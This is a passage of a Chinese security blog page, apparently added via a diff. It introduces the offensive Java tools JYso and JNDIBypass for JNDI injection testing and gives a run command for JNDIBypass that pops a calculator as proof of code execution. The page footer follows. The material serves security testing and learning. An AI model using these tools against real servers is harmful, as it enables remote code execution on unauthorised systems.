+<h3 id="Jyso"><a href="#Jyso" class="headerlink" title="Jyso"></a>Jyso</h3><p><a target="_blank" rel="noopener" href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a></p>
+<p>使用文档：<a target="_blank" rel="noopener" href="https://github.com/qi4L/JYso/wiki">https://github.com/qi4L/JYso/wiki</a></p>
+<p><img src="/./images/image-20250920153722489.png" alt="image-20250920153722489"></p>
+<p>项目运行需要在结尾添加参数<code>-j</code>,</p>
+<p><img src="/./images/image-20250920153753177.png" alt="image-20250920153753177"></p>
+<p>测试，成功弹出计算器</p>
+<h3 id="JNDIBypass"><a href="#JNDIBypass" class="headerlink" title="JNDIBypass"></a>JNDIBypass</h3><p><a target="_blank" rel="noopener" href="https://github.com/B4aron1/JNDIBypass">https://github.com/B4aron1/JNDIBypass</a></p>
+<p>运行：</p>
+<blockquote>
+<p>java -jar JNDIBypass.jar  -a 10.56.93.60 -c calc</p>
+</blockquote>
+<p>这个工具自动化，会自动尝试所有存在的可以成功的方法，<img src="/./images/image-20250920155815315.png" alt="image-20250920155815315"></p>
+<p><img src="/./images/image-20250920155824765.png" alt="image-20250920155824765"></p>
+<p><img src="/./images/image-20250920160048233.png" alt="image-20250920160048233"></p>
+<p>都可以弹出计算器</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/21/Java%E6%94%BB%E9%98%B2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="Java反序列化漏洞">
+                  <i class="fa fa-angle-left"></i> Java反序列化漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/09/21/Java%E6%94%BB%E9%98%B2/FastJson%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" rel="next" title="FastJson漏洞详解">
+                  FastJson漏洞详解 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
